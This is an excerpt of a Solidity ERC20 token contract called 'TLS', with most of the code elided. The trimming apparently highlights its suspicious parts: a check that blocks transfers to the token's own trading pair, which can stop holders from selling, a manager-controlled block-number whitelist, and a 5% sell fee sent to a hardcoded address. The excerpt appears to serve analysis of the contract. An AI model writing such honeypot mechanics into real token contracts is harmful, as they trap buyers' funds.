...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(recipient != bnbPair,"ERC20:No permit");
        ...
        fromAddress = sender;
        toAddress = recipient;  
         if(sender !=address(this) && _balances[address(this)] >= 1e14) {
    ...
    function _standardTransfer(address sender, address recipient, uint256 amount) internal{
        ...
        bool isPurchase = sender == uniswapV2Pair;
        if(isWhite){
            ...
            require(block.number >= blockLimit,"ERC20:Wrong block number");
    ...
    function _sell(address sender,address recipient,uint256 amount) internal{
        ...
        _balances[fundation] = _balances[fundation].add(amount.mul(5).div(100));
        emit Transfer(sender, fundation, amount.mul(5).div(100)); 
    }
...
contract TLS is ERC20{
    using SafeMath for uint256;
    constructor()ERC20("TLS","TLS"){
        _mint(msg.sender, 9999e18);
        ...
        bnbPair = IUniswapV2Factory(IUniswapV2Router02(uniswapV2Router).factory())
            .createPair(address(this), IUniswapV2Router02(uniswapV2Router).WETH());
        isDividendExempt[address(0)] = true;
        marketing = 0x490f2F24927376541dbC9e6884754feaA5e580C1;
        fundation = 0xc14aFd3E80C2d40eab5d010007A01EadCB94C4ef;
        manager = msg.sender;
    }
    ...
    function changeManager(address customer) public onlyManager{
        manager = customer;
    }

    function setBlockNumber(uint256 amount) public onlyManager{
